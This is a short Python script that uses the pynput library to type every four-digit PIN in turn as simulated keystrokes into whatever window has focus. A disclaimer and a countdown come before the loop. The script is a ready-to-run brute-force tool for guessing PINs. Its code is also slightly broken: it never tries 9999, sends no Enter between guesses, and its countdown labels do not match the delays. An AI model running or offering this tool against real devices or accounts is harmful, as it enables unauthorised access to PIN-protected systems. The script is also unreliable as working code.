from pynput.keyboard import Controller #Importing "pynput" module for simultaing key press
import time




print ("--------------------DISCLAIMER--------------------DISCLAIMER--------------------DISCLAIMER--------------------\n \n \n \t This Script does not stop automatically untill the entire script is finished so , you cannot use your computer untill the script is finished. \n \n Press Ctrl+C / Ctrl+Z in the shell to stop the script. \n \n Do not indulge in any illegal activities using this script \n \n The Developer IS NOT RESPONSIBLE for whatever way you choose to use this \n \n The script will start running in .... \n 14")
time.sleep(2)#Delay to select the output window.
print (" \n 12....")
time.sleep(2)
print (" \n 10....")
time.sleep(2)
print (" \n 8....")
time.sleep(1)
print (" \n 7....")
time.sleep(7) 

keyboard=Controller()

for x in range(0000,9999):
    pin=str(x)
    pin=pin.zfill(4)
    pin=list(pin)
    
    keyboard.press(pin[0]) #First pin key press - start
    keyboard.release(pin[0]) #First pin key press - end 
    time.sleep(0.1)
    
    keyboard.press(pin[1]) #Second pin key press - start
    keyboard.release(pin[1]) #Second pin key press - end 
    time.sleep(0.1)
    
    keyboard.press(pin[2]) #Third pin  key press - start
    keyboard.release(pin[2]) #Third pin key press - end  
    time.sleep(0.1)
    
    keyboard.press(pin[3]) #Fourth pin key press - start
    keyboard.release(pin[3]) #Fourth pin key press - end
    time.sleep(0.1)
    print(pin)
     


